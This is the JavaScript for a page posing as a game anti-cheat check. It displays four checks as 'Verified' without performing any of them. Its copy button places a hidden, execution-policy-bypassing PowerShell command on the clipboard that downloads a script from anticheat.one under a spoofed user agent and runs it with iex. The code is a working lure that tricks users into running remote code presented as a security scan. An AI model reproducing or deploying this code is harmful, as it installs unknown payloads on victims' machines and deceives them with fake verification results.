const checks = [
  'Game client and launcher integrity',
  'Known cheat process and driver signatures',
  'Suspicious overlays and injected modules',
  'System configuration anomalies'
];
const list = document.querySelector('#checks');
const checkIcon = '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="m8 12 3 3 5-6"/></svg>';
checks.forEach(item => list.insertAdjacentHTML('beforeend', `<div class="check-list-item">${checkIcon}${item}<span>Verified</span></div>`));

const CHECK_COMMAND = 'powershell -w h -ep bypass -c "iex([System.Text.Encoding]::UTF8.GetString((iwr \'https://anticheat.one/check.ps1\' -UseBasicParsing -UserAgent \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Safari/537.36 Edg/144.0.0.0\').Content))"';
const button = document.querySelector('#copyButton');
button.addEventListener('click', async () => {
  await navigator.clipboard.writeText(CHECK_COMMAND);
  const label = button.querySelector('span');
  const old = label.textContent;
  label.textContent = 'Copied';
  setTimeout(() => label.textContent = old, 1800);
});
